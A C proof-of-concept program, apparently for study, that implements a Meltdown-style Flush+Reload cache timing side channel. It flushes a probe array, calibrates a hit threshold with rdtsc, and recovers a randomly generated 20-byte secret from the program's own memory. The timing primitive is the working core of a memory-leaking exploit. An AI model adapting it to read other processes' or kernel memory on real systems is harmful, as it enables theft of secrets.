#include <stdio.h>
#include <stdint.h>
#include <limits.h>
#include <stdlib.h>
#include <time.h>

#define REPS_THRES 1000000 // repetitions for the threshold
#define REPS_MELT 1 // repetitions for mitigating noise in meltdown
#define BYTE 256
#define OFFSET 4096 // should theoretically work with 64, too 
#define SECRET 20

char* secret_data;	
char* probe;	

static void flush(void *p) {
    asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}

static void load(void *p) {
    asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

static int64_t timed_access(void *p, int do_flush, int do_preload) {

    if (do_flush) {
        flush(p);
    } else if (do_preload) {
        load(p);
    }

    volatile unsigned long time;
	asm __volatile__(
			"  mfence             \n"
			"  lfence             \n"
			"  rdtsc              \n"
			"  lfence             \n"
			"  movl %%eax, %%esi  \n"
			"  movl (%1), %%eax   \n"
			"  lfence             \n"
			"  rdtsc              \n"
			"  subl %%esi, %%eax  \n"
			: "=a"(time)
			: "c"(p)
			: "%esi", "%edx");
	return (int64_t) time;
}


static inline int64_t get_threshold() {
    long int time_flushed = 0;
    long int time_unflushed = 0;

    for (int i = 0; i < REPS_THRES; i++)
    {
        time_flushed += timed_access(&probe, 1, 0);
        time_unflushed += timed_access(&probe, 0, 1);
    }

    return (2*time_flushed+time_unflushed)/(3*REPS_THRES);
}


static int compare (const void * a, const void * b) {
   return ( *(int64_t*)a - *(int64_t*)b );
}



static  __attribute__((optimize("-O0"))) char melt_char(char *p, char* probe, int64_t thres) {
    int64_t access_times[BYTE];
    for(int i = 0; i < BYTE; i++) {
        access_times[i] = INT64_MAX;
    }


    for(int i = 0; i < REPS_MELT; i++) {
        for (int j = 0; j < BYTE*OFFSET; j++)
        {
            flush(&probe[j]);
        }
        for (int j = 0; j < BYTE; j++) { 
            load(&probe[*p * OFFSET]);
            int64_t tmp = timed_access(&probe[j*OFFSET], 0, 0);
            if (tmp < thres && tmp != 0 && tmp < access_times[j]) {
                access_times[j] = tmp;
            }
        }
    } 
    
    int64_t min_time = INT64_MAX;
    char min_ix;

    for(int i = 0; i < BYTE; i++) {
        if (min_time > access_times[i]) {
            min_ix = i;
            min_time = access_times[i];
        }
    }
    
    return min_ix;
}



void init_secret() {
    srand(time(NULL));
    for (int i = 0; i < SECRET; i++)
    {
        int r =  rand() % 95 + 32; // Get ASCII character in [32,127], i.e. in the range of printable characters
        secret_data[i] = r; 
    }
    printf("created random printable character array: %s\n", secret_data);
}

void init_probe() {
    for (int i = 0; i < BYTE*OFFSET; i++) {
		probe[i] = (unsigned char)(1);
	}
}
 
void main()
{   
    secret_data = malloc(SECRET);
    init_secret();

    probe = malloc(BYTE * OFFSET);
    init_probe();

    int64_t thres = get_threshold();
    printf("computed threshold: %ld\n", thres);


    char* recovered_data = malloc(SECRET); 

    for (int i = 0; i < SECRET; i++)
    {
        recovered_data[i] = melt_char(secret_data + i, probe, thres);
    }
    
    printf("expected: %s\ngot:", secret_data);    
    for (int i = 0; i < SECRET; i++)
    {
        printf("%c", recovered_data[i]);
    }
    printf("\n");
    
}

